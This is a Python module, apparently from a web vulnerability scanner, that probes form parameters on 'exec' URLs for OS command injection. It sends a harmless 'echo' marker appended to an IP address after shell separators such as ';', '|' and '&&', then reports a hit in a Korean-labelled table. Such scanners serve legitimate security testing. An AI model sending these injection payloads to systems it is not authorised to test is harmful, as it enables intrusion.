from tabulate import tabulate
import requests
from bs4 import BeautifulSoup
from rich.console import Console
from rich.table import Table
import random
import string

console = Console()

def run(soup, headers, find_path_dic):
    marker = ''.join(random.choices(string.ascii_uppercase, k=10))

    payloads = [
        f',echo {marker},', 
        f';;echo {marker};;', 
        f'&echo {marker}&',
        f'|||echo {marker}|||', 
        f';echo {marker};', 
        f'|echo {marker}|', 
        f'&&echo {marker}&&'
    ]

    exec_only_paths = [d for d in find_path_dic if 'exec' in d['url']]

    results = []

    for param_dic in exec_only_paths:
        param_url = param_dic['url']
        param_method = param_dic['method']

        if param_method.upper() == 'POST':
            for attack in payloads:
                data = {param: f'8.8.8.8{attack}' for param in param_dic['param']}
                try:
                    res = requests.post(param_url, headers=headers, data=data)
                except Exception as e:
                    console.print(f"[!] 요청 실패: {param_url} - {e}", style="bold red")
                    continue

                if marker in res.text:
                    table = Table(title="Command Injection 탐지 결과", style="white", show_lines=True)
                    table.add_column("항목", style="white")
                    table.add_column("내용", style="white")

                    table.add_row("URL", param_url)
                    table.add_row("VULN NAME", "Command Injection")
                    table.add_row("Payload", str(data))
                    console.print(table)

                    result_data = [
                        {"항목": "URL", "내용": param_url},
                        {"항목": "VULN NAME", "내용": "Command Injection"},
                        {"항목": "Payload", "내용": str(data)}
                    ]
                    results.extend(result_data)
                    break

    return results
